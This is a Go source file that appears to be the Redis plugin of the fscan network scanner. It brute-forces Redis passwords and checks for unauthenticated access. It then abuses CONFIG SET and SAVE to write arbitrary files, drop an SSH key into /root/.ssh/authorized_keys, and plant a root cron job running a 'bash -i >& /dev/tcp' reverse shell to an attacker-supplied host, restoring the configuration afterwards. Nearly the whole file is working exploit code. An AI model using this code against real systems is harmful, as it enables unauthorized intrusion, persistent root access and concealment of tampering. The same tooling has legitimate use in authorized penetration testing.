//go:build plugin_redis || !plugin_selective

package services

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net"
	"os"
	"path"
	"strings"
	"time"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// RedisPlugin Redis数据库扫描和利用插件
type RedisPlugin struct {
	plugins.BasePlugin
}

// NewRedisPlugin 创建Redis插件
func NewRedisPlugin() *RedisPlugin {
	return &RedisPlugin{
		BasePlugin: plugins.NewBasePlugin("redis"),
	}
}

// Scan 执行Redis扫描
func (p *RedisPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *ScanResult {
	config := session.Config
	target := info.Target()

	// 如果禁用暴力破解，只做服务识别
	if config.DisableBrute {
		return p.identifyService(ctx, info, session)
	}

	// 首先检查未授权访问
	if result := p.testUnauthorizedAccess(ctx, info, session); result != nil && result.Success {
		common.LogVuln(i18n.Tr("redis_unauth_success", target)) //nolint:govet

		// 如果需要利用，重新建立连接执行
		if p.shouldExploit(config) {
			p.exploitWithPassword(ctx, info, "", session)
		}
		return result
	}

	// 生成测试凭据
	credentials := GenerateCredentials("redis", config)

	// 使用公共框架进行并发凭据测试
	authFn := p.createAuthFunc(info, session)
	testConfig := DefaultConcurrentTestConfigWithTarget(config, info)
	testConfig.Concurrency = 20 // Redis 默认并发度更高

	result := TestCredentialsConcurrently(ctx, credentials, authFn, "redis", testConfig)

	// 如果成功，记录并执行利用
	if result.Success {
		common.LogVuln(i18n.Tr("redis_scan_success", target, result.Password)) //nolint:govet

		// 如果需要利用，重新建立连接执行
		if p.shouldExploit(config) {
			p.exploitWithPassword(ctx, info, result.Password, session)
		}
	}

	return result
}

// createAuthFunc 创建Redis认证函数
func (p *RedisPlugin) createAuthFunc(info *common.HostInfo, session *common.ScanSession) AuthFunc {
	return func(ctx context.Context, cred Credential) *AuthResult {
		return p.doRedisAuth(ctx, info, cred, session)
	}
}

// doRedisAuth 执行Redis认证
func (p *RedisPlugin) doRedisAuth(ctx context.Context, info *common.HostInfo, cred Credential, session *common.ScanSession) *AuthResult {
	target := info.Target()
	timeout := session.Config.Timeout

	// 建立TCP连接
	conn, err := session.DialTCP(ctx, "tcp", target, timeout)
	if err != nil {
		return &AuthResult{
			Success:   false,
			ErrorType: classifyRedisErrorType(err),
			Error:     err,
		}
	}

	// 如果有密码，进行认证
	if cred.Password != "" {
		authCmd := fmt.Sprintf("AUTH %s\r\n", cred.Password)

		_ = conn.SetWriteDeadline(time.Now().Add(timeout))
		if _, writeErr := conn.Write([]byte(authCmd)); writeErr != nil {
			_ = conn.Close()
			return &AuthResult{
				Success:   false,
				ErrorType: ErrorTypeNetwork,
				Error:     writeErr,
			}
		}

		_ = conn.SetReadDeadline(time.Now().Add(timeout))
		response := make([]byte, 512)
		n, readErr := conn.Read(response)
		if readErr != nil {
			_ = conn.Close()
			return &AuthResult{
				Success:   false,
				ErrorType: ErrorTypeNetwork,
				Error:     readErr,
			}
		}

		responseStr := string(response[:n])
		if !strings.Contains(responseStr, "+OK") {
			_ = conn.Close()
			errType := ErrorTypeUnknown
			if strings.Contains(responseStr, "WRONGPASS") ||
				strings.Contains(responseStr, "invalid password") ||
				strings.Contains(responseStr, "ERR AUTH") ||
				strings.Contains(responseStr, "NOAUTH") {
				errType = ErrorTypeAuth
			}
			return &AuthResult{
				Success:   false,
				ErrorType: errType,
				Error:     fmt.Errorf("redis认证失败: %s", strings.TrimSpace(responseStr)),
			}
		}
	}

	// 发送PING命令测试连接
	pingCmd := "PING\r\n"
	_ = conn.SetWriteDeadline(time.Now().Add(timeout))
	if _, pingWriteErr := conn.Write([]byte(pingCmd)); pingWriteErr != nil {
		_ = conn.Close()
		return &AuthResult{
			Success:   false,
			ErrorType: ErrorTypeNetwork,
			Error:     pingWriteErr,
		}
	}

	_ = conn.SetReadDeadline(time.Now().Add(timeout))
	response := make([]byte, 512)
	n, pingReadErr := conn.Read(response)
	if pingReadErr != nil {
		_ = conn.Close()
		return &AuthResult{
			Success:   false,
			ErrorType: ErrorTypeNetwork,
			Error:     pingReadErr,
		}
	}

	responseStr := string(response[:n])
	if !strings.Contains(responseStr, "PONG") {
		_ = conn.Close()
		return &AuthResult{
			Success:   false,
			ErrorType: ErrorTypeUnknown,
			Error:     fmt.Errorf("redis PING测试失败: %s", strings.TrimSpace(responseStr)),
		}
	}

	return &AuthResult{
		Success:   true,
		Conn:      conn,
		ErrorType: ErrorTypeUnknown,
		Error:     nil,
	}
}

// classifyRedisErrorType Redis错误分类
func classifyRedisErrorType(err error) ErrorType {
	if err == nil {
		return ErrorTypeUnknown
	}

	redisAuthErrors := []string{
		"wrongpass",
		"invalid password",
		"err auth",
		"noauth authentication required",
		"认证失败",
	}

	return ClassifyError(err, redisAuthErrors, CommonNetworkErrors)
}

// testUnauthorizedAccess 测试未授权访问
func (p *RedisPlugin) testUnauthorizedAccess(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *ScanResult {
	emptyCred := Credential{Username: "", Password: ""}

	result := p.doRedisAuth(ctx, info, emptyCred, session)
	if result.Success {
		if result.Conn != nil {
			_ = result.Conn.Close()
		}
		return &ScanResult{
			Type:    plugins.ResultTypeVuln,
			Success: true,
			Service: "redis",
			VulInfo: "未授权访问",
		}
	}

	return nil
}

// exploitWithPassword 使用指定密码建立连接并执行利用
func (p *RedisPlugin) exploitWithPassword(ctx context.Context, info *common.HostInfo, password string, session *common.ScanSession) {
	target := info.Target()

	conn, err := session.DialTCP(ctx, "tcp", target, session.Config.Timeout)
	if err != nil {
		common.LogError(i18n.Tr("redis_reconnect_failed", err))
		return
	}
	defer func() { _ = conn.Close() }()

	// 如果有密码，先认证
	if password != "" {
		authCmd := fmt.Sprintf("AUTH %s\r\n", password)
		_ = conn.SetWriteDeadline(time.Now().Add(session.Config.Timeout))
		if _, writeErr := conn.Write([]byte(authCmd)); writeErr != nil {
			return
		}
		_ = conn.SetReadDeadline(time.Now().Add(session.Config.Timeout))
		response := make([]byte, 512)
		if _, readErr := conn.Read(response); readErr != nil {
			return
		}
	}

	p.exploit(ctx, info, conn, password, session.Config)
}

// identifyService 服务识别
func (p *RedisPlugin) identifyService(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *ScanResult {
	target := info.Target()
	timeout := session.Config.Timeout

	conn, err := session.DialTCP(ctx, "tcp", target, timeout)
	if err != nil {
		return &ScanResult{
			Success: false,
			Service: "redis",
			Error:   err,
		}
	}
	defer func() { _ = conn.Close() }()

	// 发送PING命令识别
	pingCmd := "PING\r\n"
	_ = conn.SetWriteDeadline(time.Now().Add(timeout))
	if _, writeErr := conn.Write([]byte(pingCmd)); writeErr != nil {
		return &ScanResult{
			Success: false,
			Service: "redis",
			Error:   writeErr,
		}
	}

	_ = conn.SetReadDeadline(time.Now().Add(timeout))
	response := make([]byte, 512)
	n, readErr := conn.Read(response)
	if readErr != nil {
		return &ScanResult{
			Success: false,
			Service: "redis",
			Error:   readErr,
		}
	}

	responseStr := string(response[:n])
	var banner string

	if strings.Contains(responseStr, "PONG") {
		banner = "Redis服务 (PONG响应)"
	} else if strings.Contains(responseStr, "-NOAUTH") {
		banner = "Redis服务 (需要认证)"
	} else if strings.Contains(responseStr, "-ERR") {
		banner = "Redis服务 (协议响应)"
	} else {
		banner = "Redis服务"
	}

	common.LogSuccess(i18n.Tr("redis_service_identified", target, banner)) //nolint:govet

	return &ScanResult{
		Type:    plugins.ResultTypeService,
		Success: true,
		Service: "redis",
		Banner:  banner,
	}
}

// =============================================================================
// Redis利用核心函数
// =============================================================================

// shouldExploit 判断是否需要执行利用
func (p *RedisPlugin) shouldExploit(config *common.Config) bool {
	return !config.Redis.Disabled &&
		(config.Redis.File != "" ||
			config.Redis.Shell != "" ||
			(config.Redis.WritePath != "" &&
				(config.Redis.WriteContent != "" || config.Redis.WriteFile != "")))
}

// exploit 执行Redis漏洞利用
func (p *RedisPlugin) exploit(ctx context.Context, info *common.HostInfo, conn net.Conn, password string, config *common.Config) {
	if config.Redis.Disabled {
		return
	}

	_ = conn.SetDeadline(time.Time{})

	dbfilename, dir, err := p.getConfig(conn)
	if err != nil {
		common.LogError(i18n.Tr("redis_config_failed", err))
		return
	}

	select {
	case <-ctx.Done():
		return
	default:
	}

	// 任意文件写入
	if config.Redis.WritePath != "" && config.Redis.WriteContent != "" {
		dirPath := path.Dir(config.Redis.WritePath)
		fileName := path.Base(config.Redis.WritePath)

		if success, _, writeErr := p.writeCustomFile(conn, dirPath, fileName, config.Redis.WriteContent); writeErr != nil {
			common.LogError(i18n.Tr("redis_write_failed", writeErr))
		} else if success {
			common.LogVuln(i18n.Tr("redis_write_success", config.Redis.WritePath))
		}
	}

	// 从本地文件读取并写入
	if config.Redis.WritePath != "" && config.Redis.WriteFile != "" {
		fileContent, readErr := os.ReadFile(config.Redis.WriteFile)
		if readErr != nil {
			common.LogError(i18n.Tr("redis_read_failed", readErr))
		} else {
			dirPath := path.Dir(config.Redis.WritePath)
			fileName := path.Base(config.Redis.WritePath)

			if success, _, writeErr := p.writeCustomFile(conn, dirPath, fileName, string(fileContent)); writeErr != nil {
				common.LogError(i18n.Tr("redis_write_failed", writeErr))
			} else if success {
				common.LogVuln(i18n.Tr("redis_file_write_success", config.Redis.WriteFile, config.Redis.WritePath))
			}
		}
	}

	// SSH密钥写入
	if config.Redis.File != "" {
		if success, _, keyErr := p.writeKey(conn, config.Redis.File); keyErr != nil {
			common.LogError(i18n.Tr("redis_ssh_key_failed", keyErr))
		} else if success {
			common.LogVuln(i18n.GetText("redis_ssh_key_success"))
		}
	}

	// 定时任务写入
	if config.Redis.Shell != "" {
		if success, _, cronErr := p.writeCron(conn, config.Redis.Shell); cronErr != nil {
			common.LogError(i18n.Tr("redis_cron_failed", cronErr))
		} else if success {
			common.LogVuln(i18n.GetText("redis_cron_success"))
		}
	}

	// 恢复配置
	if err = p.recoverDB(dbfilename, dir, conn); err != nil {
		common.LogError(i18n.Tr("redis_restore_failed", err))
	}
}

// =============================================================================
// Redis利用辅助函数
// =============================================================================

func (p *RedisPlugin) readReply(conn net.Conn) (string, error) {
	_ = conn.SetReadDeadline(time.Now().Add(time.Second))
	bytes, err := io.ReadAll(conn)
	if len(bytes) > 0 {
		err = nil
	}
	return string(bytes), err
}

// sendCmd 发送Redis命令并检查OK响应
// 返回响应文本、是否成功、错误
func (p *RedisPlugin) sendCmd(conn net.Conn, cmd string) (text string, ok bool, err error) {
	if _, err = conn.Write([]byte(cmd)); err != nil {
		return "", false, err
	}
	text, err = p.readReply(conn)
	if err != nil {
		return text, false, err
	}
	return text, strings.Contains(text, "OK"), nil
}

func (p *RedisPlugin) getConfig(conn net.Conn) (dbfilename string, dir string, err error) {
	if _, err = conn.Write([]byte("CONFIG GET dbfilename\r\n")); err != nil {
		return
	}
	text, err := p.readReply(conn)
	if err != nil {
		return
	}

	text1 := strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}

	if _, err = conn.Write([]byte("CONFIG GET dir\r\n")); err != nil {
		return
	}
	text, err = p.readReply(conn)
	if err != nil {
		return
	}

	text1 = strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dir = text1[len(text1)-2]
	} else {
		dir = text1[0]
	}

	exploitPaths := []string{"/root/.ssh", "/var/spool/cron", "/var/www/html", "/tmp"}
	for _, exploitPath := range exploitPaths {
		if strings.HasPrefix(dir, exploitPath) {
			dir = "/data"
			dbfilename = "dump.rdb"
			break
		}
	}

	return
}

func (p *RedisPlugin) recoverDB(dbfilename string, dir string, conn net.Conn) (err error) {
	if _, err = fmt.Fprintf(conn, "CONFIG SET dbfilename %s\r\n", dbfilename); err != nil {
		return
	}
	if _, err = p.readReply(conn); err != nil {
		return
	}

	if _, err = fmt.Fprintf(conn, "CONFIG SET dir %s\r\n", dir); err != nil {
		return
	}
	if _, err = p.readReply(conn); err != nil {
		return
	}

	return
}

func (p *RedisPlugin) readFile(filename string) (string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer func() { _ = file.Close() }()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			return text, nil
		}
	}
	return "", err
}

func (p *RedisPlugin) writeCustomFile(conn net.Conn, dirPath, fileName, content string) (flag bool, text string, err error) {
	// 设置目录
	text, ok, err := p.sendCmd(conn, fmt.Sprintf("CONFIG SET dir %s\r\n", dirPath))
	if err != nil || !ok {
		return false, p.truncateText(text), err
	}

	// 设置文件名
	text, ok, err = p.sendCmd(conn, fmt.Sprintf("CONFIG SET dbfilename %s\r\n", fileName))
	if err != nil || !ok {
		return false, p.truncateText(text), err
	}

	// 写入内容
	safeContent := strings.ReplaceAll(content, "\"", "\\\"")
	safeContent = strings.ReplaceAll(safeContent, "\n", "\\n")
	text, ok, err = p.sendCmd(conn, fmt.Sprintf("set x \"%s\"\r\n", safeContent))
	if err != nil || !ok {
		return false, p.truncateText(text), err
	}

	// 保存
	text, ok, err = p.sendCmd(conn, "save\r\n")
	if err != nil || !ok {
		return false, p.truncateText(text), err
	}

	return true, p.truncateText(text), nil
}

// truncateText 截断文本到50字符
func (p *RedisPlugin) truncateText(text string) string {
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		return text[:50]
	}
	return text
}

func (p *RedisPlugin) writeKey(conn net.Conn, filename string) (flag bool, text string, err error) {
	// 设置目录
	text, ok, err := p.sendCmd(conn, "CONFIG SET dir /root/.ssh/\r\n")
	if err != nil || !ok {
		return false, p.truncateText(text), err
	}

	// 设置文件名
	text, ok, err = p.sendCmd(conn, "CONFIG SET dbfilename authorized_keys\r\n")
	if err != nil || !ok {
		return false, p.truncateText(text), err
	}

	// 读取密钥文件
	key, err := p.readFile(filename)
	if err != nil {
		return false, fmt.Sprintf("读取密钥文件 %s 失败: %v", filename, err), err
	}
	if len(key) == 0 {
		return false, fmt.Sprintf("密钥文件 %s 为空", filename), nil
	}

	// 写入密钥
	text, ok, err = p.sendCmd(conn, fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key))
	if err != nil || !ok {
		return false, p.truncateText(text), err
	}

	// 保存
	text, ok, err = p.sendCmd(conn, "save\r\n")
	if err != nil || !ok {
		return false, p.truncateText(text), err
	}

	return true, p.truncateText(text), nil
}

func (p *RedisPlugin) writeCron(conn net.Conn, host string) (flag bool, text string, err error) {
	// 尝试设置cron目录（两个可能的路径）
	text, ok, err := p.sendCmd(conn, "CONFIG SET dir /var/spool/cron/crontabs/\r\n")
	if err != nil {
		return false, p.truncateText(text), err
	}
	if !ok {
		// 尝试备用路径
		text, ok, err = p.sendCmd(conn, "CONFIG SET dir /var/spool/cron/\r\n")
		if err != nil || !ok {
			return false, p.truncateText(text), err
		}
	}

	// 设置文件名
	text, ok, err = p.sendCmd(conn, "CONFIG SET dbfilename root\r\n")
	if err != nil || !ok {
		return false, p.truncateText(text), err
	}

	// 解析目标地址
	target := strings.Split(host, ":")
	if len(target) < 2 {
		return false, "主机地址格式错误", nil
	}
	scanIp, scanPort := target[0], target[1]

	// 写入cron任务
	cronCmd := fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", scanIp, scanPort)
	text, ok, err = p.sendCmd(conn, cronCmd)
	if err != nil || !ok {
		return false, p.truncateText(text), err
	}

	// 保存
	text, ok, err = p.sendCmd(conn, "save\r\n")
	if err != nil || !ok {
		return false, p.truncateText(text), err
	}

	return true, p.truncateText(text), nil
}

func init() {
	RegisterPluginWithPorts("redis", func() Plugin {
		return NewRedisPlugin()
	}, []int{6379, 6380, 6381, 16379, 26379})
}
